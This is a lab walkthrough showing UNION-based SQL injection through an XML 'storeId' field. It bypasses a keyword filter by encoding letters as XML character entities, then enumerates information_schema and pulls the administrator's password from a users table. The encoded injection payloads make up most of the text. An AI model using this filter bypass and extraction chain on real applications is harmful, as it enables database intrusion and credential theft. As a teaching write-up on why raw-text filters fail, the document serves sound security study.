# SQL Injection with Filter Bypass via XML Encoding — Walkthrough

## Introduction

This lab combines two things: a **UNION-based SQL injection** inside an **XML request body**, and a **WAF-style keyword filter** that blocks obvious attack words like `AND`, `SELECT`, and `UNION` outright. The interesting part isn't the injection logic itself — it's that the app parses XML, and XML entity decoding happens *before* the SQL is built and the filter check runs against the raw request. Encode a keyword as XML character entities, and the filter never recognizes it as `SELECT` — but by the time it reaches the SQL layer, the XML parser has already decoded it back to plain text.

## How It Works

### The request format

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>18</productId>
    <storeId>1</storeId>
</stockCheck>
```

The vulnerable field is `storeId`. A normal request returns:

```
HTTP/2 200 OK
Content-Length: 9

460 units
```

Confirming: single-column output (a stock count), which matters later for UNION column-matching.

### Confirming the injection point

Adding a quote to `storeId` triggers:

```
HTTP/2 403 Forbidden
Content-Type: application/json; charset=utf-8

"Attack detected"
```

That's not a SQL error — it's the WAF firing. It's pattern-matching the raw request body for suspicious keywords before the query ever runs. Trying `UNION` or `SELECT` directly gets the same `403`.

### Bypassing the filter with XML entity encoding

Since the backend decodes XML entities before processing, encoding just the *first letter* of a blocked keyword is enough to sneak it past the filter while the SQL layer still receives the full, valid keyword:

```
UNION → &#85;NION       (U = &#85;)
SELECT → &#83;ELECT      (S = &#83;)
```

You don't need to encode the whole word — just enough characters to break the filter's exact-string match. Encoding one letter is the minimal, cleanest option; going further only makes the payload harder to read for no extra benefit unless the WAF is checking for partial/fuzzy matches too. (Handy encode/decode tool: https://coderstoolbox.net/string/#!encoding=xml&action=encode&charset=none)

## Step-by-Step Extraction

**1. Confirm the encoded UNION SELECT gets through:**

```sql
&#85;NION &#83;ELECT 1 FROM users
```

Worth being precise about what this payload actually does, since the reasoning in the original notes was a little off. This query is **not** invalid, and it doesn't "search every 1 in the columns" — it's syntactically fine and will run without error. The catch is that `SELECT 1 FROM users` doesn't select any real column data at all — `1` is a literal value, not a reference to anything in the `users` table. `FROM users` just tells the database to output that literal `1` once per row in the table. So this payload is only useful for confirming the table exists and roughly how many rows it has — it can't leak actual data, because you never asked for any real column. That's the real reason to skip past it: not that it breaks, but that it's uninformative.

Since this is a **visible, non-blind** injection (the output shows up directly in the response), there's no need to guess table/column names at all — you can just ask the database to tell you:

**2. Enumerate table names:**

```sql
&#85;NION &#83;ELECT table_name FROM information_schema.tables
```

`information_schema.tables` is the built-in metadata catalog every relational database exposes — querying it directly returns real table names, `users` among them, no guessing required.

**3. Enumerate columns of the `users` table:**

```sql
&#85;NION &#83;ELECT column_name FROM information_schema.columns WHERE table_name = &#39;users&#39;
```

(Note `'` is also encoded here as `&#39;`, since it's part of the payload string, not a filtered keyword — same bypass principle applies to any character the WAF might flag.)

Result:

```
email
password
username
```

**4. Extract the username:**

```sql
&#85;NION &#83;ELECT username FROM users
```

**5. Extract the password, scoped to a specific user:**

```sql
&#85;NION &#83;ELECT password FROM users where username=&#39;administrator&#39;
```

Scoping the query to `username='administrator'` matters for a real reason: with multiple rows in `users`, a plain `SELECT username FROM users` returns them all in whatever order the database feels like — `information_schema` and table scans have no guaranteed ordering unless you add `ORDER BY`. Filtering by a specific username sidesteps the ordering problem entirely and guarantees you're reading the password that actually belongs to the account you care about, instead of trying to match rows across two separately-ordered, unordered result sets.

**Credentials recovered:**

```
Username: administrator
Password: t3kg290f06lytmqzabyw
```

(Randomized per lab instance — regenerates on reset.)

## Common Pitfalls

- **Filters that check raw request text can be bypassed by anything the backend decodes after the check** — XML entities here, but the same idea applies to URL-encoding, Unicode normalization, double-encoding, etc. Always ask: *what decodes this payload, and does that happen before or after the filter sees it?*
- **`UNION SELECT <literal> FROM <table>` proves a table exists but leaks nothing** — don't confuse "the query ran" with "I got data." You need a real column name in the SELECT list to actually extract anything.
- **UNION column count must match the original query** — this lab's original query returns one column (`460 units`), so every UNION SELECT here uses exactly one column too. A mismatch throws a database error instead of a clean result.
- **Unordered results across separate queries can't be reliably correlated** — if you're pulling values from two different queries (e.g. usernames, then passwords) expecting them to line up row-for-row, they won't necessarily. Scope with a `WHERE` clause on a known value instead of assuming order.
